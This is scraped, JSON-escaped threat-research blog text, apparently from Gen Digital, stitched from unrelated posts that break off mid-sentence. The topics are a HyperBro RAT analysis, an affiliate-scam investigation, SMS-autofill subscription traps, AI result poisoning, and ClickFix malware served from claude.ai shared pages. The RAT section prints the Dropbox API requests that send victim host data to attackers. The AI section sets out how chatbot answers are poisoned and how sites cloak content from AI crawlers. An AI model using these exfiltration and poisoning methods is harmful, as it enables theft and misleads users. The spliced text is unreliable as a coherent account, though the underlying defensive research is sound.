server\u003c/p\u003e\u003cp\u003eXXXXXX_update.exe\u0026nbsp;\u003c/p\u003e\u003cp\u003e(sha256:2D2EA3002C367684F21AD08BDC9B5079EBDEE08B6356AC5694EFA139D4C6E60D)\u003c/p\u003e\u003cp\u003eThis archive drops three already familiar files – Symantec’s \u003cem\u003ethinprobe.exe\u003c/em\u003e, malicious \u003cem\u003ethinhostprobedll.dll\u003c/em\u003e, and \u003cem\u003ethumb.db\u003c/em\u003e. The malicious DLL is used for DLL sideloading, decrypting and decompressing \u003cem\u003ethumb.db\u003c/em\u003e and finally loading its processed content – a HyperBro RAT . This backdoor has also been reported on by \u003ca href=\"https://securelist.com/luckymouse-hits-national-data-center/86083/\"\u003eKaspersky[1]\u003c/a\u003e and \u003ca This function expects 4 arguments consisting of two strings and their corresponding lengths. The string values specify the victim ID and the Dropbox API key to use. The API key is passed in as an RC4 encrypted + base64 encoded value.\u003cbr\u003eThe hardcoded decryption key is “0000111122223333“. The DLL additionally contains a default API key which appears to be for the authors test account.\u003c/p\u003e\u003cp\u003eInitially, it tries do download a file from Dropbox via the HTTP API:\u003c/p\u003e\u003cp\u003ePOST /2/files/download HTTP/1.1\u003cbr\u003eHost: content.dropboxapi.com\u003cbr\u003eUser-Agent: Go-http-client/1.1\u003cbr\u003eContent-Length: 0\u003cbr\u003eAuthorization: Bearer [snipped]\u003cbr\u003eDropbox-Api-Arg: {“path”: “/infos/000000.txt”}\u003cbr\u003eAccept-Encoding: gzip\u003c/p\u003e\u003cp\u003eIf the server responds with a file, it tries to upload a file with a timestamp and a hostname onto Dropbox:\u003c/p\u003e\u003cp\u003ePOST /2/files/upload HTTP/1.1\u003cbr\u003eHost: content.dropboxapi.com\u003cbr\u003eUser-Agent: Go-http-client/1.1\u003cbr\u003eContent-Length: 36\u003cbr\u003eAuthorization: Bearer [snipped]\u003cbr\u003eContent-Type: application/octet-stream\u003cbr\u003eDropbox-Api-Arg: {“path”: “/infos/116a0d.txt”,”mode”: “overwrite”,”autorename”: true,”mute”: false,”strict_conflict”: false}\u003cbr\u003eAccept-Encoding: gzip\u003c/p\u003e\u003cp\u003e%currentDate% %currentTime%##%hostname%\u003c/p\u003e\u003cp\u003eAfterwards, a C\u0026amp;C request-response loop is started. Based on the response from the C\u0026amp;C server, one of the following commands is executed: download files, upload files, sleep, quit, or execute commands on a command line. Every directory from the list is searched for files with a given file extension. If such files are found and their modification date is within the provided date boundaries (in UTC), their full paths are written down into the output file. you need to know\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eThe risk:\u003c/strong\u003e CheckoutSwitch campaigns use fake parcel notices, prize offers and cloud-storage warnings to request small payments. Gen Threat Labs traced payment requests to unrelated merchants selling different products or services, from Weber barbecue grills to Oral-B toothbrushes. In one case, personal details entered on fake DHL pages also appeared in a retailer's customer account.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eThe scale:\u003c/strong\u003e Gen observes 1.2 million unique emails from these campaigns daily, reaching 200,000 to 300,000 customers each day within our protected customer base alone.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eOur advice:\u003c/strong\u003e Verify unexpected delivery notices, offers and account warnings through the company's official website or app before entering personal or card details. Even a small fee can expose you to unwanted charges and misuse of your information.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eOur investigation began with a German-language email promising a Weber Spirit grill. The message claimed to be a promotion from Hagebau, a well-known hardware retailer in Germany, and told the recipient they had already won their new grill.\u003c/p\u003e\n\u003cp\u003eThe offer fit the summer barbecue season and borrowed the credibility of two familiar brands. It also contradicted itself: elsewhere in the same message claiming the recipient had won one, the person was urged to hurry for a chance to win.\u003c/p\u003e\n\u003cp\u003eIt was the kind of spam offer we see regularly, and our protections were already blocking this type of activity. Recognizing the deception, however, told us little about the business behind the scam. We wanted to understand how these campaigns turned someone's interest in a free grill into money, and what happened to the information collected along the way.\u003c/p\u003e\n\u003cp\u003eWe began checking how widely the campaign was circulating and following its links. The grill offer connected to infrastructure carrying promotions under other brands, including offers for Oral-B dental kits. As we examined more messages, we found retail prizes, parcel delivery notifications and warnings that cloud accounts or personal files were about to disappear.\u003c/p\u003e\n\u003cp\u003eSome destinations complicated the picture. An antivirus-expiry warning redirected us to McAfee's official website, raising the possibility that deceptive messages were being used to generate sales for genuine commercial services. Identifying a fake email was only the beginning of understanding that relationship.\u003c/p\u003e\n\u003cp\u003eWe followed selected campaigns through to checkout and examined the payment attempts they generated. The merchant records allowed us to identify the scam businesses requesting the money and compare what they offered with what the emails had promised.\u003c/p\u003e\n\u003cp\u003eIn a campaign using DHL branding, that trail led us to a retailer's customer account containing the details we had entered during a supposed parcel-delivery process.\u003c/p\u003e\n\u003ch2\u003eA €9.99 delivery fee, and a shop we had never visited\u003c/h2\u003e\n\u003cp\u003eThe DHL-themed pages showed a parcel containing an Apple iPad Pro. They took us through delivery questions and asked for our contact details and address, followed by a €9.99 payment to release the shipment.\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-11/01a_Fake_DHL_Delivery_Notice.png.webp?itok=q2XVCBXm 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2026-11/01a_Fake_DHL_Delivery_Notice.png.webp?itok=uF19ix75 2x","media":"(min-width: 1020px)","type":"image/webp","width":509,"height":1077},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2026-11/01a_Fake_DHL_Delivery_Notice.png.webp?itok=nRoQ39VD 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2026-11/01a_Fake_DHL_Delivery_Notice.png.webp?itok=ZGEYnALZ 2x","media":"(min-width: 720px)","type":"image/webp","width":509,"height":1077},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-11/01a_Fake_DHL_Delivery_Notice.png.webp?itok=MDxYKxQe 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2026-11/01a_Fake_DHL_Delivery_Notice.png.webp?itok=PrirHVyV 2x","media":"(min-width: 420px)","type":"image/webp","width":509,"height":1077}],"caption":"Figure 1. The fake DHL pages show a parcel containing an iPad Pro and request delivery confirmation. The actual worldwide volume is much higher.\u003c/p\u003e\n\u003cp\u003eThe messages borrowed identities across several industries. Delivery lures used DHL, UPS, DPD and La Poste. Retail promotions and reward offers used names including Hagebau, Lidl, Walmart, Weber and Oral-B. Other messages impersonated healthcare services or used antivirus, streaming and cloud-account warnings. Whatever the brand, the narratives played on a few basic emotions: fear of losing something, such as personal files or a held parcel, and hope of gaining something, such as a prize or payout. These emotions drove both the click and the payment.\u003c/p\u003e\n\u003cp\u003eFor a separate analysis, we randomly selected about 33,000 emails per day over one month. The resulting dataset contained \u003cstrong\u003e1,090,839 unique emails\u003c/strong\u003e. Our classification showed that the traffic was overwhelmingly abusive: \u003cstrong\u003e59% was deceptive affiliate marketing, 25% was likely scams and 16% was suspicious affiliate marketing\u003c/strong\u003e. Most of the emails we analyzed fell into two categories: deceptive affiliate marketing and likely scams.\u003c/p\u003e\n\u003cp\u003eIn a separate analysis of the same dataset, we found that \u003cstrong\u003e98% of emails contained at least one Google Cloud Storage link\u003c/strong\u003e. These links redirected visitors through tracking and affiliate systems to an offer or checkout. Serving as the entry point to the affiliate network, they may help campaigns bypass spam and other email filters. Gen Security solutions already block this activity, even when the initial link uses a trusted cloud domain.\u003c/p\u003e\n\u003cp\u003eThe language distribution was heavily concentrated in English (51%) and French (35%), which together accounted for most of the analyzed emails. Limitless, Slots of Vegas, Lussurio\u003c/td\u003e\n\u003ctd\u003eClaims that a payout is waiting, leading to registration and deposit offers\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2\u003eWhat people and businesses stand to lose\u003c/h2\u003e\n\u003cp\u003eThe risks extend beyond the initial shipping fee. People can lose money on purchases they never intended to make, and some destinations introduce membership or recurring-payment terms. Providing card details through a deceptive process also exposes that information to possible theft or misuse.\u003c/p\u003e\n\u003cp\u003eThe Gearteria account showed a further consequence we could document directly: personal information collected during a fake delivery process appearing in an unrelated customer profile. That reuse creates risks of impersonation and identity fraud. A profile created without someone's knowledge also raises the risk that terms and conditions they have never seen could be accepted on their behalf, including automatic renewal of services and recurring charges. The profile itself was an observed finding. Acceptance of such terms, automatic renewal and subsequent identity theft were not established by our research.\u003c/p\u003e\n\u003cp\u003eThe companies being impersonated can suffer reputational damage and receive complaints about offers or charges they had nothing to do with.\u003c/p\u003e\n\u003cp\u003eMerchants receiving the referrals may also face consequences. A business that has not approved these methods could pay affiliate commissions for customers who were deceived about the purchase, then have to handle complaints, refunds and chargebacks.\u003c/p\u003e\n\u003cp\u003eConsumers can check the original claim before entering their details. A delivery notification can be verified through the courier's official website or app. A storage warning can be checked by opening the account independently. Unexpected promotions can be verified through the named company's own channels.\u003c/p\u003e\n\u003ch2\u003eThe business behind the spam\u003c/h2\u003e\n\u003cp\u003eWhat began with a grill offer led us to campaigns connecting familiar brands with unrelated commercial transactions. The payment records identified the merchants requesting the money, while affiliate tracking showed how referrals were credited. In the DHL case, we could also see where the personal information had gone.\u003c/p\u003e\n\u003cp\u003eSomeone agreeing to a small delivery fee can end up buying an unrelated product or service. A merchant paying affiliates in good faith may also be misled, funding promotions that deceive the customers it is paying to attract.\u003c/p\u003e\n\u003cp\u003eBusinesses need to examine the emails and pages generating those referrals and check what customers were promised before they arrived. you need to know\u003c/strong\u003e\u0026nbsp;\u003c/h2\u003e\u003cp\u003eThe risk: AI chatbots can help you find products, download software or locate websites, but the links they recommend aren't always safe. Gen Threat Labs found examples of ChatGPT directing users to fake online stores, phishing websites and malicious downloads. Sometimes, even legitimate websites recommended by AI had been compromised by criminals.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe scale: Over 90 days, Gen security products blocked more than 260,000 threat-related events associated with AI chat services, including dangerous links and attacks hosted on AI platforms.\u0026nbsp;\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eOur advice:\u003c/strong\u003e Don't assume a website is trustworthy just because an AI chatbot recommended it. Double-check website addresses, be cautious when shopping at unfamiliar stores, and keep your security protection enabled.\u0026nbsp;\u003c/p\u003e"},{"bundle":"rich_text","content":"\u003cp\u003eFor years, cybercriminals have manipulated search results to put fraudulent stores, malicious downloads and phishing sites in front of people searching for legitimate services. The practice is generally known as SEO poisoning. As more people use AI assistants to find websites and products, similar risks are beginning to appear in chatbot answers.\u0026nbsp;\u003c/p\u003e\u003cp\u003ePeople are getting used to asking chatbots for recommendations rather than searching for things themselves. And when an assistant gives you a helpful answer with a link to a website, it's easy to trust that recommendation without checking where it leads. Criminals can take advantage of that trust, particularly when they manage to get a fake store or malicious website included in an AI-generated answer.\u0026nbsp;\u003c/p\u003e\u003cp\u003eOur investigations uncovered several examples, including ChatGPT recommending a fake EcoFlow store, directing someone looking for legitimate software to a website distributing an infostealer, and linking to a respected journalism organization whose website had been compromised to redirect visitors to scams. Over the 90 days covered by our research, more than 121,000 Gen users were protected from threats associated with AI chat services.\u0026nbsp;\u003c/p\u003e\u003cp\u003eWe should also consider what happens as AI assistants start doing more things on our behalf. AI agents can increasingly navigate websites, download software and interact with online services, sometimes without requiring the user to approve every step. The attacks we've investigated mainly involve people clicking links recommended by chatbots, but these same malicious websites could also pose a risk to AI agents. As we give AI more freedom to act for us, checking the safety of the websites it interacts with will become increasingly important.\u0026nbsp;\u003c/p\u003e\u003ch2\u003e\u003cstrong\u003eFrom SEO poisoning to poisoned AI answers\u0026nbsp;\u003c/strong\u003e\u003c/h2\u003e\u003cp\u003eTraditional SEO poisoning attempts to influence where attacker-controlled content appears in search results. Now, a newer discipline called Answer Engine Optimization (AEO) is emerging, focused on making websites and their content more likely to appear in answers and recommendations from AI assistants. As AI agents become more widely used, businesses are also adapting their websites to make it easier for these systems to find, understand and use their content.\u0026nbsp;\u003c/p\u003e\u003cp\u003e\u0026nbsp;Cybercriminals can exploit these same mechanisms to get malicious websites or manipulated information into AI-generated answers. This is where AI result poisoning comes in. MITRE ATT\u0026amp;CK added AI Result Poisoning as technique \u003ca href=\"https://attack.mitre.org/techniques/T1608/007/\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eT1608.007\u003c/a\u003e in 2026, describing how attackers can manipulate publicly available\u0026nbsp; web content to influence what AI systems retrieve or recommend.\u0026nbsp;\u003c/p\u003e\u003cp\u003eHow do scam links end up in a chatbot's answer? We see four routes. First, the model can learn from poisoned data, so a bad recommendation is baked in before anyone asks. Second, the chatbot searches the web, finds content an attacker planted or a legitimate site the attacker has compromised, and passes it on as a citation or recommendation. Third, the model invents a plausible domain, such as a “.io” address for a well-known app, and a criminal registers it to carry out their scam. Fourth, the AI platform itself is only the host: attackers publish a lure in a shared conversation and send people there. From the outside we often cannot tell the first three apart. For the person who clicks, it makes no difference – all point to fraud.\u0026nbsp;\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-11/linkstoAI4ways%20%281%29_0.png.webp?itok=iixqL53r 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2026-11/linkstoAI4ways%20%281%29_0.png.webp?itok=FZWxUrVY 2x","media":"(min-width: 1020px)","type":"image/webp","width":1170,"height":658},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2026-11/linkstoAI4ways%20%281%29_0.png.webp?itok=JU9PBl4T 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2026-11/linkstoAI4ways%20%281%29_0.png.webp?itok=OMMgcCy4 2x","media":"(min-width: 720px)","type":"image/webp","width":890,"height":501},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-11/linkstoAI4ways%20%281%29_0.png.webp?itok=COHjO9mS 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2026-11/linkstoAI4ways%20%281%29_0.png.webp?itok=bhI6P7Rl 2x","media":"(min-width: 420px)","type":"image/webp","width":690,"height":388}],"caption":"Figure 1. Their websites can check a visitor's IP address, location, browser or operating system and decide what content to display. An automated crawler might see a perfectly legitimate page, while a regular user visiting the same URL gets redirected to a scam or a website distributing malware.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe same techniques can work against AI assistants. When ChatGPT retrieves information from a website, it may see legitimate content and include a link in its answer. But when someone clicks that link, the website can recognize the visitor and redirect them to a malicious destination. Attackers can also compromise a legitimate website after the AI assistant has accessed it.\u0026nbsp;\u003c/p\u003e\u003cp\u003eAI platforms have their own security measures, but attackers are constantly looking for ways around them, just as they have done with search engines for years. Our investigations show why users shouldn't automatically trust a website simply because an AI chatbot recommended it.\u0026nbsp;\u003c/p\u003e\u003ch2\u003e\u003cstrong\u003eHow people can reduce their risk\u0026nbsp;\u003c/strong\u003e\u003c/h2\u003e\u003cp\u003eWhen an assistant recommends a software download, check the developer's official domain before installing it. A familiar project name in the address bar is not enough, particularly when a lookalike site is distributing a modified installer. For unfamiliar stores, verify the business independently, including its contact details, policies, reputation and relationship to any brand it claims to represent.\u0026nbsp;\u003c/p\u003e\u003cp\u003eBe cautious with investment sites offering unusually attractive opportunities but little verifiable company information. Treat unexpected login screens, CAPTCHA-like instructions to run commands and AI-shared installation guides with similar skepticism. Our web protection helps block malicious websites, phishing and scams, including those reached through AI chatbot recommendations. This is particularly important when dealing with compromised websites or malicious redirects, where the content a user encounters may be different from what the AI assistant saw earlier. We also use AI to help people identify scams, with solutions such as Norton Genie Scam Detector.\u0026nbsp;\u003c/p\u003e\u003cp\u003eAs AI assistants become more capable and start performing tasks on our behalf, we need to extend that protection beyond traditional browsing. Cybercriminals will keep finding new ways to abuse these technologies, and our job is to anticipate those threats and protect people from them.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThat's how we help have found mobile subscription services sending payment authorization messages in a format that lets phones and browsers offer the code for autofill. The message explains the charge, including how often it repeats, but someone can accept the suggested code without opening it. In the iPhone example we tested, the suggestion displayed an amount while leaving out the fact that it would be charged every week.\u0026nbsp;\u003c/p\u003e\u003cp\u003eWe use the name BillBait for misleading subscription journeys that use SMS autofill to let people enter a payment authorization code without opening the message containing the subscription terms.\u0026nbsp;\u003c/p\u003e\u003cp\u003eAt Gen Threat Labs, we have been examining subscription journeys in Poland, Switzerland, Denmark and Canada. Our investigation looks at the use of these autofill-formatted messages in services charged through a mobile operator, and how that changes the information people encounter when making a purchase.\u0026nbsp;\u003c/p\u003e\u003cp\u003eMost of us are used to receiving codes by SMS. We enter them to sign into accounts, confirm transactions and prove that a phone number belongs to us. Having the phone retrieve the code saves us from switching between the message and the website, so accepting the suggestion can become as routine as entering the code ourselves.\u0026nbsp;\u003c/p\u003e\u003cp\u003eFor a subscription charged through a mobile operator, however, the message also explains the financial commitment associated with that code. Someone expecting a routine phone number verification may be authorizing a recurring payment.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp\u003ePaying through a mobile account has been around for years. Premium SMS services have been used to buy content and pay for services. Although the billing arrangements differ, some subscription journeys involve entering a phone number on a website and \u003ca href=\"https://archiwum.uke.gov.pl/aktualnosci/biezace-informacje/komunikaty/wakacje-co-musimy-wiedziec-o-czym-pamietac%2C6049.html\" target=\"_blank\" rel=\"noreferrer noopener\"\u003econfirming it with a code received by SMS\u003c/a\u003e.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe messages we examined use a format that associates the code with a website. Alongside the text intended for the customer, they include a machine-readable line containing the domain and the code. In the captured Polish message, that pair is:\u0026nbsp;\u003c/p\u003e\u003cp\u003e\u003ccode\u003e@[REDACTED].com #2976\u0026nbsp;\u003c/code\u003e\u003c/p\u003e\u003cp\u003eWith the appropriate website and browser support, this allows the code to be offered for autofill. The domain helps the software determine where the code belongs, while the person can enter it without opening the message and rewriting it across.\u0026nbsp;\u003c/p\u003e\u003cp\u003eGoogle’s \u003ca href=\"https://web.dev/articles/sms-otp-form\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eguidance on SMS codes\u003c/a\u003e describes banks and card issuers using them as an additional security check during a payment. In the subscription journeys we examined, the code itself is the only authorization and verification to start recurring charges on the user’s mobile account. Someone who believes they are verifying their phone number may therefore be completing a step that authorizes a paid subscription. The SMS explains what the code authorizes, including the price and billing frequency, but autofill allows the person to enter it without opening that message. A code intended to confirm a financial commitment can then be handled as casually as a routine login code.\u0026nbsp;\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-10/Screenshot%202026-10-21%20120007-2.png.webp?itok=zAQsjNnV 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2026-10/Screenshot%202026-10-21%20120007-2.png.webp?itok=UFJljuZb 2x","media":"(min-width: 1020px)","type":"image/webp","width":889,"height":1109},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2026-10/Screenshot%202026-10-21%20120007-2.png.webp?itok=6-fiIQZM 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2026-10/Screenshot%202026-10-21%20120007-2.png.webp?itok=GUFD4O9n 2x","media":"(min-width: 720px)","type":"image/webp","width":889,"height":1109},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-10/Screenshot%202026-10-21%20120007-2.png.webp?itok=PzqhIEg7 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2026-10/Screenshot%202026-10-21%20120007-2.png.webp?itok=L10g45RW 2x","media":"(min-width: 420px)","type":"image/webp","width":690,"height":861}],"caption":"Figure 1. A person concentrating on the suggested code sees an amount, while the weekly billing frequency has to be understood from information elsewhere in the journey. The text of the message is regulated and it has to contain all the information about payment, service name and unsubscribe information. On the other hand, the text on the webpage is commonly hiding this information behind the keyboard and using different font sizes to hide the payment details. The SMS message is the only part where the information can’t hide.\u0026nbsp;\u003c/p\u003e\u003cp\u003eChrome presents the message differently in the Android example. Together, they illustrate two parts of the problem we are examining: how a request is presented to the customer, and how a payment authorization code is offered by the phone.\u0026nbsp;\u003c/p\u003e\u003cp\u003eFor anyone encountering these requests, opening the complete SMS before submitting the code is a useful precaution. Check that the service name matches what you intended to buy and that the amount is charged at the frequency you expect. If the message describes a subscription you were not looking for, stop there, even if the website has presented the code as a routine check.\u0026nbsp;\u003c/p\u003e\u003cp\u003eIf you discover an unfamiliar charge on your mobile bill, contact your operator through its official app, website or customer service number. Ask who is collecting the payment, how to cancel it and how to dispute the charge. Keep the messages and screenshots, and verify the cancellation instructions before following them. Some services use a STOP message, but blocking the sender or marking it as SPAM does not help, the charges will continue.\u0026nbsp;\u003c/p\u003e\u003cp\u003ePeople who do not use premium services can also ask their operator about blocking them, checking separately what controls apply to third-party billing. The available options depend on the operator and country.\u0026nbsp;\u003c/p\u003e\u003cp\u003eOn the iPhone we tested, Apple’s autofill suggestion showed 14.99 zł without saying that the charge would repeat every week. Chrome displayed the full SMS, weekly charge included, but inside a browser prompt that carried Google's authority and was designed to be approved rather than read. The page was hosted on claude.ai, which is Anthropic’s own domain. It had Claude’s branding and what looked like simple instructions to install the desktop application. The attackers even paid for Google ads to send people there.\u003c/p\u003e\u003cp\u003eAnthropic, of course, never published such instructions. The attackers used Claude’s features for sharing conversations and Artifacts, and through them they placed malicious content on the real website. The page did not offer any installer. Instead, it told visitors to copy a command and paste it into the Terminal on their Mac. Everybody who followed these steps installed Atomic macOS Stealer (AMOS) — a malware that is made to steal passwords, browser sessions, cryptocurrency wallets and other sensitive data.\u003c/p\u003e\u003cp\u003eOur analysis found one more unpleasant thing. The malware can also replace the legitimate Ledger and Trezor desktop applications with modified versions. Later these fake versions ask the user to type the wallet recovery phrase, and this gives the attackers everything they need to take the victim’s cryptocurrency.\u003c/p\u003e\u003cp\u003eAnd this wasn't limited to macOS. We identified another campaign using Claude's sharing features and Google Ads to target Windows users. The installation instructions were different, as was the malware being delivered, but the approach was essentially the same.\u003c/p\u003e\u003cp\u003eNeither campaign required compromising Anthropic's infrastructure or registering a convincing imitation of its domain. The attackers simply took advantage of features available to ordinary Claude users, turning legitimate content-sharing functionality into a way to distribute malware.\u003c/p\u003e\u003ch2\u003eWhen the scam lives on the real domain\u003c/h2\u003e\u003cp\u003eMost phishing and scam campaigns depend on small details that the visitor is supposed to not notice — a domain name with a typo, a strange top-level domain, a missing padlock.\u003c/p\u003e\u003cp\u003eThis campaign removes all of that. The fake “Download Claude” page is real user-generated content hosted on claude.ai, and it is served in two ways: as a Shared Chat (claude[.]ai/share/…) and as a public Artifact (claude[.]ai/artifact/…). The command starts a chain of scripts that are downloaded from the attacker’s server, but for the operating system it looks like you typed it.\u003c/strong\u003e\u003c/li\u003e\u003cli class=\"ck-list-marker-bold\" data-list-item-id=\"e659ccd39d70f4d47697b4f8d3d876653\"\u003e\u003cstrong\u003eThe command is scrambled on purpose. What you get on your clipboard is an obfuscated one-liner that hides the attacker’s address inside an encoded blob. So even a curious user sees only gibberish and not a suspicious URL.\u003c/strong\u003e\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eThe most useful habit you can build is one: never paste into your Terminal a command that you did not write yourself. No legitimate application — not Claude and not anything else — needs you to run a cryptic one-liner to be installed.\u003c/p\u003e\u003ch2\u003e\u003cstrong\u003eThe theft begins\u003c/strong\u003e\u003c/h2\u003e\u003cp\u003eThe moment you paste the command into your Terminal and press Enter, a chain of several stages runs completely in the background:\u003c/p\u003e\u003cul type=\"disc\"\u003e\u003cli class=\"ck-list-marker-bold\" data-list-item-id=\"e5e30139718460616724f21dd812ee6cb\"\u003e\u003cstrong\u003eA loader script is downloaded data-list-item-id=\"eb8f50c6940661ee2f7a9486df6524399\"\u003e\u003cstrong\u003eThis second script downloads the main payload — an AppleScript-based infostealer from the Atomic macOS Stealer (AMOS) 420px)","type":"image/webp","width":690,"height":1035}],"caption":"The whole attack, step by step: from the fake claude.ai page to the stolen data and, later, the theft of the wallet the stealer can take anything, it needs Full Disk Access. If it does not have this access, it does not start to steal. Instead it shows a fake macOS “Full Disk Access required” message and quietly adds a line to the shell startup file, so the malware starts again the next time you open the Terminal. In this way it simply waits until it gets the access it needs. Once it has the access, the stealer shows a familiar dialog: a fake macOS “System Preferences” password prompt. It looks native and it does not go away until you type a password that really works. After you type it, the malware has your login password in cleartext, and it keeps it.\u003c/p\u003e\u003cp\u003eAfter this it harvests, fast and quietly: Passwords and session cookies from Chromium and Gecko based browsers along with Keychain keys it needs to decrypt saved logins, crypto wallets both browser-extension and desktop applications and also files that usually hold secrets, private or otherwise interesting data such as with .pdf, .docx, .key, .seed or .pem, .wallet, or .ovpn extensions.\u003c/p\u003e\u003cp\u003eAll the collected data is packed into a ZIP file and uploaded to the attacker’s server. After the upload the stealer deletes its temporary files, so it leaves less trace behind.\u003c/p\u003e\u003ch2\u003eFake wallet apps\u003c/h2\u003e\u003cp\u003eWhen the stealer sees that Ledger Live, Ledger Wallet, or Trezor Suite is installed, it downloads a trojanized copy of this application from the attacker and puts it over the real one. The modified application looks and works like a normal one.\u003c/p\u003e\u003cp\u003eThe trap activates later. The next time when you open your wallet, a convincing screen asks you to “restore” or “validate” your recovery phrase (for Trezor it even shows a fake progress animation: “Reading device info… Validating seed phrase… Almost there”). The words that you type go directly to a second attacker server — a different domain than the one which delivered the malware, and it is built only to collect seed phrases.\u003c/p\u003e\u003cp\u003eThose words are your money. Anybody who has them can empty every wallet that is derived from them, immediately and without any way back.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eThe same trick comes to Windows\u003c/h2\u003e\u003cp\u003eWe also identified a separate campaign targeting Windows users. But the method does not really care about the operating system, and we found a second campaign on claude.ai that works in exactly the same way — only the victim and the final malware are different.\u003c/p\u003e\u003cp\u003eThe lure is again a page that lives on the real domain. This time it is an Artifact with the title “Install Claude on Windows”, and it is pushed in the same way: the link carries Google Ads parameters (gclid, gad_campaignid), so the attackers again paid to place it high in the search results. The page shows the Claude logo, a friendly “Three quick steps and you’re done”, and the same thin “Content is user-generated and unverified” banner on the top that almost nobody reads.\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-10/Screenshot%202026-10-23%20at%2014.13.02.png.webp?itok=F83IIL2Y 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2026-10/Screenshot%202026-10-23%20at%2014.13.02.png.webp?itok=Io37tZxs 2x","media":"(min-width: 1020px)","type":"image/webp","width":1170,"height":756},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2026-10/Screenshot%202026-10-23%20at%2014.13.02.png.webp?itok=HAkPCDtA 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2026-10/Screenshot%202026-10-23%20at%2014.13.02.png.webp?itok=UFJIzmmf 2x","media":"(min-width: 720px)","type":"image/webp","width":890,"height":575},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-10/Screenshot%202026-10-23%20at%2014.13.02.png.webp?itok=ARbJfQwq 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2026-10/Screenshot%202026-10-23%20at%2014.13.02.png.webp?itok=vyRXU_25 2x","media":"(min-width: 420px)","type":"image/webp","width":690,"height":446}],"caption":"The Windows lure, hosted as a claude.ai Artifact: “Install Claude on Windows”. Instead of a real installer it gives three keyboard steps — Win + R, Ctrl + V, Enter — and the same small “user-generated and unverified” banner on the top.","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-10/Screenshot%202026-10-23%20at%2014.13.02.png.webp?itok=ARbJfQwq","link":""}]},{"bundle":"rich_text","content":"\u003cp\u003eWhat changes is the ClickFix itself. On the Mac the victim is sent to the Terminal. On Windows the page asks you to press Win + R (this opens the Run dialog), then Ctrl + V to paste, and Enter to run. No Terminal, no file to download — only three keys, and the attack starts.\u003c/p\u003e\u003cp\u003eWhat you paste is a PowerShell command, and it is malicious from the first character — there is no installer in it at all. To look harmless while it runs, it first prints a big “SYSTEM” banner and calm messages like “Challenge in progress, this won’t take long… 50% done… 70% done… Challenge completed.” For the victim it looks like a normal verification step.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThat script reaches out to GitHub. The attackers put their next stage on a github.io page, so once more a trusted name carries the malware. The file downloaded looks like an ordinary script, but inside it carries the\u0026nbsp; .NET payload, packed and encrypted.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eThe final payload\u003c/h2\u003e\u003cp\u003eThe final payload is a heavily obfuscated .NET executable.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe behavior however, is clear enough. The malware hides itself by injecting its code into a normal Windows process, so in the task list nothing looks wrong. It checks which antivirus is present, it takes screenshots of the desktop, and it reads the title of the window where the user is working. It also opens a connection to a server of the attacker and keeps it — which means the operator can send more commands later. This is the behavior of a remote-access tool, not of a simple program that steals once and goes away.\u003c/p\u003e\u003cp\u003eAnd it goes after cryptocurrency. The malware searches the infected computer for crypto wallets — desktop applications like Electrum, Exodus, Ethereum, Bitcoin and Ledger, and also wallet extensions inside the browser.\u003c/p\u003e\u003cp\u003eTwo campaigns, two operating systems, two different pieces of malware — but one and the same front door: a page on claude.ai that looks official, pushed by paid ads, asking the user to run a single command 